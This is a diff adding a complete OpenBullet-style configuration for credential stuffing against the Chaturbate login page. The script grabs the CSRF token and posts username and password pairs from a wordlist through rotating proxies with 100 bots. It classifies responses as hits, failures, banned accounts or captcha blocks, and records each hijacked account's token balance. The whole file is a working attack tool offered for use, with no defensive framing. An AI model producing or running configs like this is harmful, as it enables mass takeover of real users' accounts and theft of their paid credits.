@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Chaturbate",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-03T19:25:19.4421421+00:00",
+  "AdditionalInfo": "",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "https://en.chaturbate.com/auth/login/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_CSRF PARSE "<SOURCE>" LR "name='csrfmiddlewaretoken' value='" "'" Recursive=FALSE -> VAR "CSRF" "" "" 
+#LOGIN REQUEST POST "https://en.chaturbate.com/auth/login/" AutoRedirect=TRUE 
+  CONTENT "next=&csrfmiddlewaretoken=<CSRF>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://en.chaturbate.com/auth/login/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "LOG OUT" 
+  KEYCHAIN Failure OR 
+    KEY "Please correct the errors below." 
+    KEY "<title>Account Banned - Chaturbate</title>" 
+  KEYCHAIN Ban OR 
+    KEY "aptcha is required" 
+#CAPTURE_TOKENS PARSE "<SOURCE>" LR "span class='tokencount'>" "<" Recursive=FALSE -> CAP "Tokens" "" "" 
